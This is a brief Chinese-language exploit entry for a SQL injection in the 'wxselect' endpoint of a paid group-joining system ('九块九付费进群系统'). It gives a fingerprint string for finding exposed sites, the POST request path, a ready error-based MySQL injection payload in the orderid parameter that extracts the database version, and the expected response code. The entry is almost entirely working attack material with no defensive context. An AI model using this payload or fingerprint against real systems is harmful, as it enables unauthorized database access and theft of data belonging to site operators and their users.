# 九块九付费进群系统wxselectSQL注入漏洞

九块九付费进群系统wxselect ｜ SQL注入 ｜ —
- **指纹**：`body="/website/index/login.html"`
- **请求**：`POST /group/index/wxselect HTTP/1.1`

**Payload**
```
orderid=') AND GTID_SUBSET(CONCAT((MID((IFNULL(CAST(VERSION() AS NCHAR),0x7e)),1,190))),5417)-- ylIU
```
- **响应特征**：200